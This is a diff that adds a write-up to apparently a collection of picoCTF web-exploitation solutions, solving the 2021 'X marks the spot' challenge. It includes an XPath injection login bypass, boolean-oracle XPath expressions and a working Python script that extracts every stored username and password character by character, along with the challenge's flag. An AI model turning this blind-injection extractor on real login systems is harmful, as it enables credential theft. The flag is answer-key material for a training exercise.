@@ -31,7 +31,7 @@ Web Exploitation entails the manipulation of websites and web hosted services us
 - [Some Assembly Required 3 (2021)](#some-assembly-required-3) ✓
 - [Web Gauntlet 2 (2021)](#web-gauntlet-2) ✓
 - [Some Assembly Required 4 (2021)](#some-assembly-required-4)
-- [X marks the spot (2021)](#x-marks-the-spot)
+- [X marks the spot (2021)](#x-marks-the-spot) ✓
 - [Web Gauntlet 3 (2021)](#web-gauntlet-3) ✓
 - [Bithug (2021)](#bithug)
 - [login (2021)](#login) ✓
@@ -4747,6 +4747,262 @@ Another login you have to bypass. Maybe you can find an injection that works? ht
 
 <summary markdown="span">Solution 1</summary>
 
+Visiting the website, we find a login form.  We can inspect the source:
+
+~~~html
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>X marks the spot</title>
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h3 class="text-muted">X marks the spot</h3>
+	</div>  
+        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
+        
+      
+      <div class="jumbotron">
+		<div class="row">
+			<div class="col-xs-12 col-sm-12 col-md-12">
+				<h2 style="color:red">This is my super secret website</h2>
+				<h4>Only I know the password, and I don't use any of those regular old unsafe query languages!</h4>
+			</div>
+		</div>
+		<br/>
+        <div class="login-form">
+            <form role="form" action="/" method="post">
+            <div class="row">
+                <div class="form-group col-xs-6">
+                    <input type="text" name="name" id="name" class="form-control input-lg" placeholder="username">
+                </div>
+                <div class="form-group col-xs-6">
+                    <input type="text" name="pass" id="pass" class="form-control input-lg" placeholder="password">
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-xs-4">
+                </div>
+                <div class="col-xs-4">
+                    <input type="submit" class="btn btn-lg btn-primary btn-block" value="Login">
+                </div>
+                <div class="col-xs-4">
+                </div>
+            </div>
+			</form>
+			<!--
+			Two roads diverged in a yellow wood,
+			And sorry I could not travel both
+			And be one traveler, long I stood
+			And looked down one as far as I could
+			To where it bent in the undergrowth;
+
+			Then took the other, as just as fair,
+			And having perhaps the better claim,
+			Because it was grassy and wanted wear;
+			Though as for that the passing there
+			Had worn them really about the same,
+
+			And both that morning equally lay
+			In leaves no step had trodden black.
+			Oh, I kept the first for another day!
+			Yet knowing how way leads on to way,
+			I doubted if I should ever come back.
+
+			I shall be telling this with a sigh
+			Somewhere ages and ages hence:
+			Two roads diverged in a wood, and I—
+			I took the one less traveled by,
+			And that has made all the difference.
+										-Robert Frost
+				-->
+		</div>
+	  </div>
+
+
+		<footer class="footer">
+			<p>&copy; PicoCTF</p>
+		</footer>
+	</div>
+
+<script>
+$(document).ready(function(){
+    $(".close").click(function(){
+        $("myAlert").alert("close");
+    });
+});
+</script>
+</body>
+
+</html>
+~~~
+
+The hints suggests this website uses [XPATH](https://www.w3schools.com/xml/xpath_syntax.asp).  A useful [website](https://owasp.org/www-community/attacks/XPATH_Injection) detailing XPath injection attacks, provides an example injection using username = blah' or 1=1 or 'a'='a and password = blah.  We submit this to the website and get the message "You're on the right path.".
+
+Trying the same, with just 2 statements, results in a login failure message.  We can use the central logic query to extract data from the website.
+	
+We can write a python script to test logic statements:
+
+~~~py
+import requests
+
+HUNT = "on the right path"
+URL  = "http://mercury.picoctf.net:33594/"
+
+user_start = "blah' or "
+user_end   = " or 'a'='a"
+password    = "blah"
+
+logic_statement = "1=1"
+
+username = user_start + logic_statement + user_end
+
+postdata = {"name": username, "pass": password}
+
+# Retrieve cookie:
+s = requests.Session()
+r = s.post(URL,data=postdata)
+s.close()
+
+if HUNT in r.text:
+    print("logic is true")
+~~~
+
+Using an [xpath cheatsheet](https://devhints.io/xpath), we can derive several logic statements for injection:
+
+~~~
+//user[count(child::node())> X]
+This will return true if the user count is greater than X
+
+string-length(//user[position()= X ]/name = Y
+This will return true if the username for user in position X has length Y
+
+string-length(//user[position()= X ]/pass = Y
+This will return true if the password for user in position X has length Y
+
+substring(//user[position() = X ]/name, Y,1)="Z"
+This will return true if the letter at position Y of the username for user at position X is Z
+
+substring(//user[position() = X ]/pass, Y,1)="Z"
+This will return true if the letter at position Y of the password for user at position X is Z
+~~~
+
+This can be iterated through in python to retrieve all users and passwords:
+
+~~~py
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests
+import string
+
+HUNT = "on the right path"
+URL  = "http://mercury.picoctf.net:33594/"
+
+user_start = "blah' or "
+user_end   = " or 'a'='a"
+pass_input    = "blah"
+
+ALPHABET = string.printable
+
+def test_logic(logic_statement):
+    name_input = user_start + logic_statement + user_end
+    postdata = {"name": name_input, "pass": pass_input}
+
+    # Retrieve cookie:
+    s = requests.Session()
+    r = s.post(URL,data=postdata)
+    s.close()
+    
+    if HUNT in r.text:
+        return 1
+    else:
+        return 0
+
+index = []
+username = []
+password = []
+
+#find number of users:
+for i in range(1000):
+    logic_statement = "//user[count(child::node())>" + str(i) + "]"
+    if test_logic(logic_statement):
+        continue
+    else:
+        user_count = i
+        print("{} users found".format(user_count))
+        break
+
+# find usernames:
+for i in range(1,user_count+1):
+    for j in range(1000):
+        logic_statement = "string-length(//user[position()=" + str(i) + "]/name) = " + str(j)
+        if test_logic(logic_statement):
+            user_len = j
+            print("user {} name-length {}".format(i,j))
+            break
+    name = ""
+    for j in range(1,user_len+1):
+        for letter in ALPHABET:
+            logic_statement = 'substring(//user[position()=' + str(i) + ']/name,' + str(j) + ',1)=\"' + letter + ('\"')
+            if test_logic(logic_statement):
+                name += letter
+                break
+    print("user {} name = {}".format(i,name))
+    username.append(name)
+    index.append(i)
+    for j in range(1000):
+        logic_statement = "string-length(//user[position()=" + str(i) + "]/pass) = " + str(j)
+        if test_logic(logic_statement):
+            pass_len = j
+            print("user {} password length {}".format(i,j))
+            break
+    user_pass = ""
+    for j in range(1,pass_len+1):
+        for letter in ALPHABET:
+            logic_statement = 'substring(//user[position()=' + str(i) + ']/pass,' + str(j) + ',1)=\"' + letter + ('\"')
+            if test_logic(logic_statement):
+                user_pass += letter
+                break
+    print("user {} password = {}".format(i,user_pass))
+    password.append(user_pass)
+~~~
+
+Running this we get:
+
+~~~
+5 users found
+user 1 name-length 5
+user 1 name = guest
+user 1 password length 16
+user 1 password = thisisnottheflag
+user 2 name-length 3
+user 2 name = bob
+user 2 password length 22
+user 2 password = thisisnottheflageither
+user 3 name-length 5
+user 3 name = admin
+user 3 password length 50
+user 3 password = picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_8d7f0533}
+user 4 name-length 0
+user 4 name = 
+user 4 password length 0
+user 4 password = 
+user 5 name-length 0
+user 5 name = 
+user 5 password length 0
+user 5 password = 
+~~~
+
+Which provides the flag.
+
 </details>
 
 ### Answer
@@ -4756,7 +5012,7 @@ Another login you have to bypass. Maybe you can find an injection that works? ht
 <summary markdown="span">Flag</summary>
 
 ~~~
-picoCTF{}
+picoCTF{h0p3fully_u_t0ok_th3_r1ght_xp4th_8d7f0533}
 ~~~
 
 </details>
